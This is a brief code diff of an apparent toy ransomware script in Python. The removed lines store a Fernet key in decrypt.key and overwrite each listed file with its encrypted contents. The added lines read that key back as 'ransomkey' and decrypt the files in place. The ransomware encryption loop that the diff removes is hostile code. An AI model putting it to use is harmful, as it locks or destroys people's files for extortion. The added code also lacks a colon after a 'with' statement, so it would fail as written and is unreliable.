@@ -22,12 +22,12 @@ key = Fernet.generate_key()
 
 
 
-with open("decrypt.key", "wb") as  cryptkey:
-	cryptkey.write(key)
+with open("decrypt.key", "rb") as key
+	ransomkey = key.read()
 
 for file in files:
 	with open(file, "rb") as thefile:
 		contents = thefile.read()
-	contents_encrypted = Fernet(key).encrypt(contents)
+	contents_decrypted = Fernet(ransomkey).decrypt(contents)
 	with open(file, "wb") as thefile:
-		thefile.write(contents_encrypted)
+		thefile.write(contents_decrypted)
